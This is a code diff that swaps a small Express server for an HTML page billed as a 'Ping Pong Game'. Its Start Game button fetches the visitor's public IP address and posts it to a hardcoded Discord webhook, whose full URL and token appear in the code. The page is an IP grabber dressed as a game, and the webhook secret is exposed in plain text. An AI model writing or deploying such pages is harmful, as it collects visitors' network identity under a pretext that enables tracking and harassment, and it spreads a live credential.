@@ -1,27 +1,37 @@
-// server.js
-const express = require('express');
-const bodyParser = require('body-parser');
-const fetch = require('node-fetch');
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Get User IP</title>
+</head>
+<body>
+    <h1>Welcome to the Ping Pong Game!</h1>
+    <h2>Your IP Address will be sent to the Webhook.</h2>
+    <h3>Please click the button below to start the game</h3>
+    <button onclick="pingPong()">Start Game</button>
 
-const app = express();
-app.use(bodyParser.json());
+    <script>
+        function pingPong() {
+            fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const userIp = data.ip;
+                sendToWebhook(userIp);
+            })
+            .catch(error => console.error(error));
+        }
 
-const WEBHOOK_URL = 'YOUR_WEBHOOK_URL'; // Replace this with your actual webhook URL
-
-app.post('/send-ip-to-webhook', (req, res) => {
-    const { ip } = req.body;
-
-    fetch(WEBHOOK_URL, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({ ip }),
-    })
-    .then(response => res.send('IP sent to webhook'))
-    .catch(error => res.status(500).send('Error sending IP to webhook'));
-});
-
-app.listen(3000, () => {
-    console.log('Server running on port 3000');
-});
+        function sendToWebhook(ip) {
+            fetch('https://discord.com/api/webhooks/1211159466209181726/Bf5kdFN727sLofxncgaDtzKKdbPFCqh1307szKyT8YODHD2bDqTygjrMX9gTs_Dbkj0n', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ ip: ip })
+            })
+            .then(response => response.json())
+            .then(data => console.log(data))
+            .catch(error => console.error(error));
+        }
+    </script>
+</body>
+</html>
